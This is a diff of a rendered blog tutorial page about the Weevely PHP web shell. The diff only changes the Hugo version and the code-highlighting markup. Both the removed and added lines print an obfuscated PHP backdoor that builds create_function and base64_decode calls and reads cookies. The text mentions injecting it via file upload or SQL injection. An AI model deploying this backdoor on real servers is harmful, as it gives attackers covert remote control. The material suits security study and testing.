@@ -79,7 +79,7 @@ php: this is the default, a single PHP script is generated
     <link rel="icon" type="image/png" href="https://10degres.net/assets/img/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://10degres.net/assets/img/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="generator" content="Hugo 0.102.2" />
   </head>
 
   <body class=" ">
@@ -168,17 +168,17 @@ to tell Apache that the image should be considered as a regular PHP script (th
 <p><img src="https://10degres.net/images/weevely-generate.png" alt="Weevely generate"></p>
 <p>A <code>sessions</code> directory has also been created to log every command.
 No matter what creation mode you choosed the obfuscated generated PHP code looks like this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-$ztqi <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;h&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;hshtrh_rhehphlhahche&#34;</span>);
-$hule<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;am9pbihhcnJhehrV9zbGhrljZSgkYSwkhrYhrygkYhrSktMykpKShrkpO2VjaG8gJzwvJhry4kay4nhrPic7fQ==&#34;</span>;
-$xhmv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PSdlcnRhr5JztlY2hvIhrCc8Jy4kay4nPihrc7ZXhrZhbChiYXNlNjRfZGVjbhr2RlKHBhryZWdfchrmVhrwbGFjZ&#34;</span>;
-$ezko<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ShhcnJheSgnL1hrteXHc9XHNdLycsJy9chrcy8nKSwgYXJyYXkohrJyhrcshrJyhrsnKSwg&#34;</span>;
-$kyjf<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;JGM9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYhrSk9PSdheicgJihrYgJGMoJGEpPjMpeyRr&#34;</span>;
-$tjbu <span style="color:#f92672">=</span> $ztqi(<span style="color:#e6db74">&#34;g&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;basgeg6g4g_gdgegcgode&#34;</span>);
-$plri <span style="color:#f92672">=</span> $ztqi(<span style="color:#e6db74">&#34;y&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;cyreyatye_yfuynycytyiyon&#34;</span>);
-$pigj <span style="color:#f92672">=</span> $plri(<span style="color:#e6db74">&#39;&#39;</span>, $tjbu($ztqi(<span style="color:#e6db74">&#34;hr&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $kyjf<span style="color:#f92672">.</span>$xhmv<span style="color:#f92672">.</span>$ezko<span style="color:#f92672">.</span>$hule))); $pigj();
-<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p>There is different ways to inject the backdoor on the target server: file upload, SQL injection and so on&hellip;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$ztqi <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;h&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;hshtrh_rhehphlhahche&#34;</span>);
+</span></span><span style="display:flex;"><span>$hule<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;am9pbihhcnJhehrV9zbGhrljZSgkYSwkhrYhrygkYhrSktMykpKShrkpO2VjaG8gJzwvJhry4kay4nhrPic7fQ==&#34;</span>;
+</span></span><span style="display:flex;"><span>$xhmv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PSdlcnRhr5JztlY2hvIhrCc8Jy4kay4nPihrc7ZXhrZhbChiYXNlNjRfZGVjbhr2RlKHBhryZWdfchrmVhrwbGFjZ&#34;</span>;
+</span></span><span style="display:flex;"><span>$ezko<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ShhcnJheSgnL1hrteXHc9XHNdLycsJy9chrcy8nKSwgYXJyYXkohrJyhrcshrJyhrsnKSwg&#34;</span>;
+</span></span><span style="display:flex;"><span>$kyjf<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;JGM9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYhrSk9PSdheicgJihrYgJGMoJGEpPjMpeyRr&#34;</span>;
+</span></span><span style="display:flex;"><span>$tjbu <span style="color:#f92672">=</span> $ztqi(<span style="color:#e6db74">&#34;g&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;basgeg6g4g_gdgegcgode&#34;</span>);
+</span></span><span style="display:flex;"><span>$plri <span style="color:#f92672">=</span> $ztqi(<span style="color:#e6db74">&#34;y&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;cyreyatye_yfuynycytyiyon&#34;</span>);
+</span></span><span style="display:flex;"><span>$pigj <span style="color:#f92672">=</span> $plri(<span style="color:#e6db74">&#39;&#39;</span>, $tjbu($ztqi(<span style="color:#e6db74">&#34;hr&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $kyjf<span style="color:#f92672">.</span>$xhmv<span style="color:#f92672">.</span>$ezko<span style="color:#f92672">.</span>$hule))); $pigj();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>There is different ways to inject the backdoor on the target server: file upload, SQL injection and so on&hellip;
 Once you have infected your target, you can connect to the client with the password you choosed:</p>
 <p><img src="https://10degres.net/images/weevely-connect.png" alt="Weevely connect"></p>
 <p>Running <code>:help </code>will display the list of all modules available or the detailed usage informations of the given module.</p>
